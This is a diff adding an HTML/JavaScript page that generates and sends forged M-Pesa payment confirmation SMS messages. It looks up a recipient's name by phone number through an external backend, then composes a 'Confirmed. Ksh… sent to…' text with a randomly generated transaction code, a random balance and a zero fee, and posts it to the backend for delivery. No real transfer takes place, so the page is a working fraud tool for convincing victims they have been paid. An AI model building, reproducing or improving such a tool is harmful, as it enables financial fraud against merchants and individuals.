@@ -1,0 +1,170 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title></title>
+<style>
+body { font-family: Arial, sans-serif; background: #f3f3f3; }
+.container { max-width: 450px; background: #fff; margin:50px auto; padding:20px; border-radius:6px; box-shadow:0 0 10px rgba(0,0,0,.1);}
+h2 { text-align: center; }
+label { display: block; margin-top:10px; font-weight:bold; }
+input, button { width:100%; padding:8px; margin-top:5px; display:none; }
+input.active, button.active { display:block; }
+button { background:#2e7d32; color:white; border:none; cursor:pointer; }
+button:hover { background:#1b5e20; }
+pre { background:#eee; padding:10px; white-space: pre-wrap; margin-top:10px; }
+
+.radio-group { display:none; margin-top:10px; }
+.radio-group label { display:inline-block; margin-right:10px; cursor:pointer; padding:8px 15px; border:1px solid #2e7d32; border-radius:4px; background:#fff; transition:0.2s; }
+.radio-group input { display:none; }
+.radio-group label.selected { background:#2e7d32; color:white; }
+</style>
+</head>
+<body>
+<div class="container">
+
+<!-- Step 1: Phone -->
+<label id="phoneLabel"></label>
+<input type="text" id="phone" placeholder="Enter number" class="active">
+<button id="phoneOkBtn" class="active">OK</button>
+
+<!-- Step 2: Amount -->
+<label id="amountLabel"></label>
+<input type="number" id="amount" placeholder="Amount">
+<button id="amountOkBtn">Next</button>
+
+<!-- Step 3: Name -->
+<label id="nameLabel"></label>
+<input type="text" id="name" placeholder="Enter name">
+<button id="nameOkBtn">Next</button>
+
+<!-- Step 4: Pochi/Till ONLY -->
+<div class="radio-group" id="phoneOptionContainer">
+  <label></label><br>
+  <label id="pochiLabel" class="selected"><input type="radio" name="includePhone" value="pochi" checked> </label>
+</div>
+
+<!-- Step 5: Send button -->
+<button id="sendBtn">Send</button>
+
+<h3></h3>
+<pre id="output"></pre>
+</div>
+
+<script>
+const API = "https://mpesa-1-mc8e.onrender.com";
+
+const phoneInput = document.getElementById("phone");
+const phoneLabel = document.getElementById("phoneLabel");
+const phoneOkBtn = document.getElementById("phoneOkBtn");
+const amountInput = document.getElementById("amount");
+const amountLabel = document.getElementById("amountLabel");
+const amountOkBtn = document.getElementById("amountOkBtn");
+const nameInput = document.getElementById("name");
+const nameLabel = document.getElementById("nameLabel");
+const nameOkBtn = document.getElementById("nameOkBtn");
+const sendBtn = document.getElementById("sendBtn");
+const output = document.getElementById("output");
+const phoneOptionContainer = document.getElementById("phoneOptionContainer");
+
+/* ================= HELPERS ================= */
+function calculateCost(amount) {
+  return 0;
+}
+
+function generateUAToken() {
+  const chars="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+  let token="UA";
+  for(let i=0;i<8;i++) token+=chars[Math.floor(Math.random()*chars.length)];
+  return token;
+}
+
+function randomBalance(){ return (Math.random()*5000+100).toFixed(2);}
+function formatDateTime(){
+  const d=new Date();
+  return `${d.getDate()}/${d.getMonth()+1}/${String(d.getFullYear()).slice(-2)} at `
+       + d.toLocaleTimeString([], {hour:'numeric',minute:'2-digit'});
+}
+
+/* ================= HIDE PREVIOUS STEP ================= */
+function hidePreviousStep(input, label, okBtn) {
+  input.classList.remove("active");
+  label.style.display = "none";
+  okBtn.classList.remove("active");
+}
+
+/* ================= STEP 1: PHONE ================= */
+phoneOkBtn.addEventListener("click", async ()=>{
+  const phone = phoneInput.value.trim();
+  if(!phone) return alert("Enter number");
+
+  const res = await fetch(`${API}/lookup/${phone}`);
+  const data = await res.json();
+
+  if(data.found){
+    nameInput.value = data.name;
+  } else {
+    nameInput.value = "";
+  }
+
+  // Hide phone step, show amount step
+  hidePreviousStep(phoneInput, phoneLabel, phoneOkBtn);
+  amountInput.classList.add("active");
+  amountLabel.style.display = "block";
+  amountOkBtn.classList.add("active");
+});
+
+/* ================= STEP 2: AMOUNT ================= */
+amountOkBtn.addEventListener("click", ()=>{
+  const amount = parseFloat(amountInput.value);
+  if(!amount || amount <= 0) return alert("Enter valid amount");
+
+  // Hide amount step, show name step
+  hidePreviousStep(amountInput, amountLabel, amountOkBtn);
+  nameInput.classList.add("active");
+  nameLabel.style.display = "block";
+  nameOkBtn.classList.add("active");
+});
+
+/* ================= STEP 3: NAME ================= */
+nameOkBtn.addEventListener("click", ()=>{
+  if(nameInput.value.trim()==="") return alert("Enter name");
+  
+  // Hide name step, show final step
+  hidePreviousStep(nameInput, nameLabel, nameOkBtn);
+  phoneOptionContainer.style.display="block";
+  sendBtn.classList.add("active");
+});
+
+/* ================= STEP 5: SEND ================= */
+sendBtn.addEventListener("click", async ()=>{
+  const phone = phoneInput.value.trim();
+  const amount = parseFloat(amountInput.value);
+  const name = nameInput.value.trim();
+  if(!phone || !amount || amount <=0) return alert("Phone and valid amount required");
+  if(!name) return alert("Enter name");
+
+  const cost = calculateCost(amount);
+  const token = generateUAToken();
+  const balance = randomBalance();
+  const datetime = formatDateTime();
+
+  const message = `${token} Confirmed. Ksh${amount.toFixed(2)} sent to ${name} on ${datetime}. New Mpesa balance is Ksh${balance}. Transaction cost, Ksh${cost.toFixed(2)}. Amount you can transact within the day is 499,960.00.Sign up for Lipa Na M-PESA Till online https://m-pesaforbusiness.co.ke `;
+
+  const payload = { phone, name, amount, cost, message, token };
+  const res = await fetch(`${API}/send`, {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify(payload)
+  });
+  const data = await res.json();
+  if(data.error) return alert(data.error);
+  output.textContent = message;
+
+  // Reset form completely
+  location.reload();
+});
+</script>
+</body>
+</html>
